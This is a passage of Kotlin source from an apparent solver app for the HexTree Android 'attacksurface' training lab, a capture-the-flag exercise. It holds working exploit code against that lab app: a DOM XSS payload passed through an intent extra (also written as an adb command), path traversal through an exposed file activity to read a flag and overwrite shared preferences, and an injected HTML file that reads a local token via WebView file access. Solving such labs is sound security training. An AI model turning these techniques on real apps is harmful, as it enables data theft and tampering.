        item { FlagItem(39, "DOM XSS via intent extra: The Activity safely serializes our input into JSON, but the internal HTML file likely uses an insecure sink (like innerHTML) to render it. We inject an HTML tag with an inline event handler to execute hextree.success().\n\nADB Solver:\nadb shell am start -n io.hextree.attacksurface/.webviews.Flag39WebViewsActivity --es NAME \"<img src=x onerror=hextree.success()>\"") {
            try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"); putExtra("NAME", "<img src=x onerror=hextree.success()>") }) } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(40, "Universal File Access bypass: Inject JS to read local token.") {
            try {
                var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag40ExploitFragment(), "f40")?.commit()
            } catch (e: Exception) { e.printStackTrace() } } }
        item { FlagItem(41, "Custom Tabs Service Spoofing: Spoof PostMessage directly over IPC.") {
            try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity") }) } catch (e: Exception) { e.printStackTrace() } } }
    }
}

@Preview(showBackground = true)
@Composable
fun MainContentPreview() {
    HexTreeSolverTheme { MainContent() }
}

class Flag35ExploitFragment : android.app.Fragment() {
    private var stage = 1
    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); executeStage() }
    private fun executeStage() { startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"); putExtra("filename", "../flag35.txt") }, 35) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 35 && data?.data != null) {
            val uri = data.data!!
            try {
                if (stage == 1) { activity.contentResolver.openOutputStream(uri)?.use { it.write("i".toByteArray()) }; stage = 2; executeStage() }
                else { val f = activity.contentResolver.openInputStream(uri)?.bufferedReader()?.use { it.readText() }; Toast.makeText(activity, "Flag 35: $f", Toast.LENGTH_LONG).show(); activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss() }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
class Flag36ExploitFragment : android.app.Fragment() {
    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity"); putExtra("filename", "../shared_prefs/Flag36Preferences.xml") }, 36) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 36 && data?.data != null) {
            try {
                activity.contentResolver.openOutputStream(data.data!!)?.use { it.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><boolean name=\"solved\" value=\"true\" /></map>".toByteArray()) }
                Toast.makeText(activity, "🛑 SWIPE AWAY HexTree, then open Flag 36!", Toast.LENGTH_LONG).show(); activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
class Flag40ExploitFragment : android.app.Fragment() {
    override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState); startActivityForResult(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity"); putExtra("filename", "exploit40.html") }, 40) }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 40 && data?.data != null) {
            try {
                activity.contentResolver.openOutputStream(data.data!!)?.use { it.write("<!DOCTYPE html><html><body><script>try{var x=new XMLHttpRequest();x.open('GET','token.txt',false);x.send(null);hextree.authCallback(x.responseText);}catch(e){hextree.authCallback('Error:'+e);}</script></body></html>".toByteArray()) }
                startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK); putExtra("URL", "file:///data/data/io.hextree.attacksurface/files/exploit40.html") })
                activity.fragmentManager.beginTransaction().remove(this).commitAllowingStateLoss()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
}
